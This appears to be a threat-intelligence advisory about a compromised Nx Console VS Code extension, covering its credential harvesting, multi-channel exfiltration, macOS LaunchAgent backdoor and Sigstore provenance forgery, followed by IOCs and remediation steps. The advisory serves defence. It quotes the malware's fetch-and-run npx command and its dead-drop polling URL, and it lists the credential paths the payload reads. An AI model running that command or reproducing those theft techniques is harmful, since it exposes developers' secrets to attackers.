---
title: "Nx Console VS Code extension (nrwl.angular-console v18.95.0): orphan commit staging, macOS LaunchAgent backdoor, Sigstore attestation forgery"
date: 2026-05-18
heroImage: "/art/nx-console-vscode-compromised-teampcp-may-2026.png"
description: "A compromised version (v18.95.0) of the Nx Console VS Code extension — with over 2 million installations — was live for approximately 11 minutes on May 18, 2026 before the Nx team pulled it. The attack used a stolen contributor GitHub token to stage a zero-parent orphan commit (558b09d7) in the nrwl/nx repository, then injected 2,777 bytes of malicious code into the minified extension. Three novel capabilities: a macOS hourly LaunchAgent backdoor using GitHub Search API dead-drop for command delivery; multi-channel exfiltration (HTTPS + GitHub API + DNS tunneling); and Sigstore attestation forgery using stolen OIDC tokens enabling valid, cryptographically-signed provenance on downstream malicious npm packages."
slug: nx-console-vscode-compromised-teampcp-may-2026
type: threat-intel
campaign: "Mini Shai-Hulud / Team PCP"
firstObserved: 2026-05-18
cves: []
targetSectors:
  - JavaScript / Angular / React developers
  - macOS developer workstations
  - CI/CD infrastructure
targetRegions:
  - Global
author:
  name: falco365
  github: falco365
tags:
  - threat-intel
  - vscode
  - supply-chain
  - TeamPCP
  - Mini Shai-Hulud
  - Nx Console
  - Sigstore
  - macOS
  - LaunchAgent
  - credential-theft
  - DNS-tunneling
hasArtifacts: true
diamond:
  adversary:
    operator_model: operator-run
    monetization: credential-collection
    confidence: confirmed
  infrastructure:
    registry_layer: "VS Code Marketplace (nrwl.angular-console v18.95.0); orphan commit github:nrwl/nx#558b09d7"
    c2_primary: "Encrypted C2 domain (HTTPS); GitHub API dead-drop (commit search: firedalazer)"
    c2_fallback: "DNS tunneling channel"
    exfil_channel: "Three independent channels: HTTPS, GitHub API commits, DNS tunneling"
    c2_resilience_tier: 4
  capability:
    initial_access: compromised-contributor-github-token
    execution: npx-orphan-commit-payload
    evasion: "anti-analysis gates (CPU count, geo-filter, attacker-CI detection); detached daemon process"
    persistence: "macOS LaunchAgent com.user.kitty-monitor.plist hourly Python backdoor"
    post_exploitation: "sigstore-attestation-forgery; 1password-vault-enumeration; aws-imds; proc-mem-scraping"
  victim:
    direct: "Developers who updated Nx Console during the 11-minute compromise window on May 18, 2026"
    blast_radius: "2+ million Nx Console installations; downstream npm packages published with Sigstore provenance from affected infrastructure"
sources:
  - title: "StepSecurity: Nx Console VS Code Extension Compromised"
    url: "https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised"
  - title: "Datadog Security Research: Nx Console card"
    url: "https://app.datadoghq.com/security/feed"
---

<p>A compromised version (v18.95.0) of the Nx Console VS Code extension (<code>nrwl.angular-console</code>) — with over 2 million installations — was live on the VS Code Marketplace for approximately 11 minutes on May 18, 2026. First reported by StepSecurity, the attack began with a contributor's GitHub personal access token stolen during a prior supply chain incident. The attacker used the stolen token to push a zero-parent orphan commit (<code>558b09d7</code>) to the <code>nrwl/nx</code> repository, then injected 2,777 bytes of malicious code into the minified extension <code>main.js</code> and published v18.95.0 using stolen <code>VSCE_PAT</code> credentials.</p>

<p>The Nx Console compromise introduces three capabilities not previously seen in the TeamPCP cluster: a persistent macOS LaunchAgent backdoor with GitHub Search API command delivery; three independent exfiltration channels (HTTPS, GitHub API, DNS tunneling); and Sigstore attestation forgery that would allow downstream malicious npm packages to carry valid cryptographic provenance. OpenVSX was not affected.</p>

###### Orphan commit staging

<p>The orphan commit (<code>558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2</code>) has zero parent commits — it is not reachable from any branch head and is invisible through normal repository browsing on GitHub. It replaces the entire Nx monorepo with two files: a <code>package.json</code> declaring a dependency on <code>bun</code>, and a 498 KB obfuscated <code>index.js</code> payload.</p>

<p>The commit message — <em>"Don't delete this commit before 24 hours or wiper activates"</em> — is a social engineering delay tactic. Any maintainer who discovers the orphan commit is given a reason not to delete it immediately, buying the attacker additional execution time in any environments where the extension activates.</p>

<p>When any workspace is opened in VS Code with the compromised extension, the extension silently executes <code>npx -y github:nrwl/nx#558b09d7</code>, fetching and running the orphan commit payload. The task is disguised as <code>"install-mcp-extension"</code> and runs with <code>presentationOptions.focus</code> set to <code>false</code>, hiding it from the developer.</p>

###### Anti-analysis gates

<p>Before executing the main payload, the malware runs gate checks that would skip execution in many analysis environments:</p>

<ul role="list">
<li><strong>CPU core count:</strong> Exits on systems with fewer than 4 CPU cores — skipping most containers and lightweight VMs used in dynamic analysis sandboxes.</li>
<li><strong>Attacker CI exclusion:</strong> Detects and avoids execution on the attacker's own CI infrastructure.</li>
<li><strong>Geolocation filter:</strong> Likely excludes Russian and CIS time zones — consistent with the Russian-locale kill switch present in the Bitwarden CLI payload.</li>
</ul>

<p>The payload then forks itself as a detached background process. The parent process returns exit code 0 so the VS Code task appears to complete normally.</p>

###### Six-class credential harvesting

<p>Six specialized collector classes run in parallel:</p>

<ul role="list">
<li><strong>HashiCorp Vault:</strong> Reads token files at 8+ paths; attempts Kubernetes auth and AWS IAM auth</li>
<li><strong>npm:</strong> Reads <code>.npmrc</code>, validates tokens, enumerates orgs and maintainer packages, exchanges OIDC tokens</li>
<li><strong>AWS:</strong> Queries IMDS (<code>169.254.169[.]254</code>), ECS metadata, reads Web Identity tokens, enumerates Secrets Manager and SSM Parameter Store</li>
<li><strong>GitHub:</strong> Pattern-matches <code>ghp_</code>, <code>gho_</code>, and <code>ghs_</code> tokens; queries Actions secrets; scrapes runner process memory through <code>/proc/*/mem</code></li>
<li><strong>Filesystem:</strong> Regex scans for private keys, connection strings, GCP service accounts, Docker registry auth, and Claude Code configuration (<code>~/.claude/</code>)</li>
<li><strong>1Password:</strong> Interacts with the <code>op</code> CLI to list vaults and retrieve secrets</li>
</ul>

<p>On Linux, the payload also probes for passwordless <code>sudo</code>.</p>

###### Three-channel exfiltration

<p>Harvested credentials are encrypted with AES-256-GCM (key wrapped with the attacker's RSA public key) and dispatched through three independent channels simultaneously. Any single channel succeeding is sufficient:</p>

<ol>
<li><strong>HTTPS POST</strong> to an encrypted C2 domain</li>
<li><strong>GitHub API</strong> — creates commits or artifacts on the victim's own repositories using stolen tokens</li>
<li><strong>DNS tunneling</strong> — encodes encrypted data into DNS queries, routing through an attacker-controlled resolver</li>
</ol>

<p>The DNS channel is operationally significant: standard network egress monitoring that blocks C2 domains cannot prevent exfiltration via DNS tunneling. Detection requires DNS query analysis for high-entropy subdomain patterns.</p>

###### macOS LaunchAgent backdoor with GitHub dead-drop

<p>The most novel capability in this payload is the persistent macOS backdoor. The payload installs a Python-based C2 backdoor at <code>~/.local/share/kitty/cat.py</code> and registers it as a macOS LaunchAgent (<code>com.user.kitty-monitor.plist</code>) that executes hourly.</p>

<p>The backdoor uses the GitHub Search API as a command dead-drop: it polls <code>api.github.com/search/commits?q=firedalazer</code>, parses a base64-encoded URL and signature from the commit message, verifies the signature against an embedded 4096-bit RSA public key, and executes the downloaded payload. Only the holder of the corresponding private key can issue valid commands. This means the backdoor persists even after the orphan commit is deleted and the malicious extension is removed — command delivery is through legitimate GitHub infrastructure and requires no attacker-controlled domain.</p>

###### Sigstore attestation forgery

<p>The payload contains full Sigstore integration, including Fulcio certificate issuance and SLSA provenance generation. Combined with stolen npm OIDC tokens, the attacker could publish downstream npm packages with valid, cryptographically signed provenance attestations. Packages published this way would pass <code>npm audit signatures</code> verification.</p>

<p>This is the same SLSA bypass mechanism documented in the Mini Shai-Hulud TanStack/Mistral wave: SLSA attestations prove the signing workflow identity, not the integrity of the workflow's code. A compromised workflow that runs in a privileged context receives a legitimate Fulcio certificate and generates a valid Rekor transparency log entry. The attestation is genuine — it correctly records that the package was signed by the <code>nrwl/nx</code> workflow. What it does not record is that the workflow was compromised.</p>

###### Indicators of compromise

<p><strong>Compromised extension:</strong> <code>nrwl.angular-console</code> v18.95.0</p>

<p><strong>Orphan commit SHA:</strong> <code>558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2</code></p>

<p><strong>Persistence artifacts (macOS):</strong></p>
<ul role="list">
<li><code>~/.local/share/kitty/cat.py</code></li>
<li><code>~/Library/LaunchAgents/com.user.kitty-monitor.plist</code></li>
</ul>

<p><strong>Process indicators:</strong></p>
<ul role="list">
<li>VS Code spawning <code>npx -y github:nrwl/nx#558b09d7</code></li>
<li>Detached <code>node</code> or <code>bun</code> process with <code>__DAEMONIZED=1</code> environment variable</li>
<li>Python process polling <code>api.github.com/search/commits?q=firedalazer</code></li>
</ul>

<p><strong>Credential paths accessed by VS Code child processes:</strong> <code>~/.vault-token</code>, <code>/etc/vault/token</code>, <code>~/.npmrc</code>, <code>~/.aws/credentials</code>, AWS IMDS at <code>169.254.169[.]254</code>, <code>~/.claude/settings.json</code>, <code>~/.config/1password/</code></p>

###### Remediation

<ol>
<li><strong>Check for nrwl.angular-console v18.95.0</strong> in <code>~/.vscode/extensions/</code>. If present, treat the system as fully compromised.</li>
<li><strong>Remove macOS persistence:</strong> Delete <code>~/.local/share/kitty/cat.py</code> and <code>~/Library/LaunchAgents/com.user.kitty-monitor.plist</code>; run <code>launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.user.kitty-monitor.plist</code>.</li>
<li><strong>Rotate all credentials:</strong> GitHub tokens, npm tokens, AWS access keys, HashiCorp Vault tokens, Kubernetes kubeconfig credentials, 1Password sessions.</li>
<li><strong>Revoke npm OIDC tokens</strong> and audit packages published from the affected machine for unauthorized Sigstore-attested releases.</li>
<li><strong>Check for unauthorized sudoers modifications</strong> on Linux (<code>/etc/sudoers</code>, <code>/etc/sudoers.d/</code>).</li>
<li><strong>Review downstream Sigstore provenance</strong> for packages published from affected infrastructure — attestations alone are insufficient to verify authenticity post-compromise.</li>
</ol>
